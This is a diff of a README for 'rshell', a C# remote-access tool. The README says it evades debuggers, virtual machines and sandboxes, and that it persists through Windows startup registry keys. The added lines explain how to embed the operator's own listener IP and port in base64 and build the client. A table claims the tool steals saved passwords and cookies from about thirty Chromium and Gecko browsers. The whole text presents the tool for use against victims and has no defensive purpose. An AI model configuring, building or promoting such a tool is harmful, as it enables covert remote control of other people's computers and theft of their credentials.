@@ -1,5 +1,8 @@
 # rshell
 Remote shell made in C#, blocks all known debuggers, vm's and sandboxes.
+Language
+![C¤](https://img.shields.io/badge/-C%2B%2B%2014-%2300599C?style=plastic&logo=csharp)
+
 Last update: 16.1.22
 <img src="https://github.com/spuqe/rshell/blob/main/rshell.jpg?" alt="RSHELL" border="0">
 
@@ -18,6 +21,12 @@ sandboxing software such as:
 * VMware Workstation
 * Oracle VirtualBox
 * Sandboxie
+
+# How to use?
+First of all you need to decide which version of rshell listener you're using, netcore version works with Linux and other one works on Windows.
+Open rshell client, find host IP which is encoded with base64, now you should add your own IP + port you will be listening at into it as base64 for example 
+http://127.0.0.1:1337/ = aHR0cDovLzEyNy4wLjAuMToxMzM3Lw==
+Now build the file and hope it works x)
 
 All other features:
 * Add program to Windows startup (you can choose the key name in registry)
@@ -49,11 +58,42 @@ All other features:
 * Search for services
 * See installation location
 
-# How to use?
-First of all you need to decide which version of rshell listener you're using, netcore version works with Linux and other one works on Windows.
-Open rshell client, find host IP which is encoded with base64, now you should add your own IP + port you will be listening at into it as base64 for example 
-http://127.0.0.1:1337/ = aHR0cDovLzEyNy4wLjAuMToxMzM3Lw==
-Now build the file and hope it works x)
+# Browsers:
+
+| № | Browser Name | Passwords | Cookies | History | Bookmarks |
+| --- | --- | --- | --- | --- | --- |
+| 1 | Chrome | &#9989; | &#9989; | &#8987; | &#8987; |
+| 2 | Microsoft Edge | &#9989; | &#9989; | &#8987; | &#8987; |
+| 3 | Chromium | &#9989; | &#9989; | &#8987; | &#8987; |
+| 4 | Brave - Browser | &#9989; | &#9989; | &#8987; | &#8987; |
+| 5 | Epic Privacy Browser | &#9989; | &#9989; | &#8987; | &#8987; |
+| 6 | Amigo | &#9989; | &#9989; | &#8987; | &#8987; |
+| 7 | Vivaldi | &#9989; | &#9989; | &#8987; | &#8987; |
+| 8 | Orbitum | &#9989; | &#9989; | &#8987; | &#8987; |
+| 9 | Atom | &#9989; | &#9989; | &#8987; | &#8987; |
+| 10 | Kometa | &#9989; | &#9989; | &#8987; | &#8987; |
+| 11 | Comodo Dragon | &#9989; | &#9989; | &#8987; | &#8987; |
+| 12 | Torch | &#9989; | &#9989; | &#8987; | &#8987; |
+| 13 | Slimjet | &#9989; | &#9989; | &#8987; | &#8987; |
+| 14 | 360Browser | &#9989; | &#9989; | &#8987; | &#8987; |
+| 15 | Maxthon3 | &#9989; | &#9989; | &#8987; | &#8987; |
+| 16 | K - Melon | &#9989; | &#9989; | &#8987; | &#8987; |
+| 17 | Sputnik | &#9989; | &#9989; | &#8987; | &#8987; |
+| 18 | Nichrome | &#9989; | &#9989; | &#8987; | &#8987; |
+| 19 | CocCoc Browser | &#9989; | &#9989; | &#8987; | &#8987; |
+| 20 | Uran | &#9989; | &#9989; | &#8987; | &#8987; |
+| 21 | Chromodo | &#9989; | &#9989; | &#8987; | &#8987; |
+| 22 | Yandex(old) | &#9989; | &#9989; | &#8987; | &#8987; |
+| 23 | Firefox | &#9989; | &#9989; | &#8987; | &#8987; |
+| 24 | Waterfox | &#9989; | &#9989; | &#8987; | &#8987; |
+| 25 | Cyberfox | &#9989; | &#9989; | &#8987; | &#8987; |
+| 26 | K - Meleon | &#9989; | &#9989; | &#8987; | &#8987; |
+| 27 | Thunderbird | &#9989; | &#9989; | &#8987; | &#8987; |
+| 28 | IceDragon | &#9989; | &#9989; | &#8987; | &#8987; |
+| 29 | BlackHaw | &#9989; | &#9989; | &#8987; | &#8987; |
+| 30 | Pale Moon | &#9989; | &#9989; | &#8987; | &#8987; |
+--------------------------------------------------
+Basically anything based on chromium or gecko
 
 # ToDo:
 * Improve anti-vm and anti-debug systems.
